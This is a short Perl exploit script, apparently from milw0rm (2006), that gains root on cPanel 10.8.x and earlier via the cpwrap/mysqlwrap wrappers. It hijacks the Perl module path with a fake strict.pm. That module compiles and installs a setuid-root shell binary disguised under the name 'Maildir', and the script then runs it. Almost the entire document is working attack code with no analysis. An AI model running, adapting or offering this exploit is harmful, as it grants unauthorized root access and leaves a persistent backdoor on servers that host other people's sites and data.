#!/usr/bin/perl -w

# 10/01/06 - cPanel <= 10.8.x cpwrap root exploit via mysqladmin
# use strict; # haha oh wait..

my $cpwrap       = "/usr/local/cpanel/bin/cpwrap";
my $mysqlwrap    = "/usr/local/cpanel/bin/mysqlwrap";
my $pwd          = `pwd`;

chomp $pwd;
$ENV{'PERL5LIB'} = "$pwd";

if ( ! -x "/usr/bin/gcc" )  { die "gcc: $!\n"; }
if ( ! -x "$cpwrap" )       { die "$cpwrap: $!\n"; }
if ( ! -x "$mysqlwrap" )    { die "$mysqlwrap: $!\n"; }

open  (CPWRAP, "<$cpwrap") or die "Could not open $cpwrap: $!\n";
while(<CPWRAP>) {
   if(/REMOTE_USER/) { die "$cpwrap is patched.\n"; }
}
close (CPWRAP);

open  (STRICT, ">strict.pm") or die "Can't open strict.pm: $!\n";
print  STRICT  "\$e  = \"int main(){setreuid(0,0);setregid(0,0);system(\\\\\\\"/bin/bash\\\\\\\");}\";\n";
print  STRICT  "system(\"/bin/echo -n \\\"\$e\\\">Maildir.c\");\n";
print  STRICT  "system(\"/usr/bin/gcc Maildir.c -o Maildir\");\n";
print  STRICT  "system(\"/bin/chmod 4755 Maildir\");\n";
print  STRICT  "system(\"/bin/rm -f Maildir.c strict.pm\");\n";
close (STRICT);

system("$mysqlwrap DUMPMYSQL 2>/dev/null");

if ( -e "Maildir" ) {
   system("./Maildir");
}
else {
   unlink "strict.pm";
   die "Failed\n";
}

# milw0rm.com [2006-10-01]
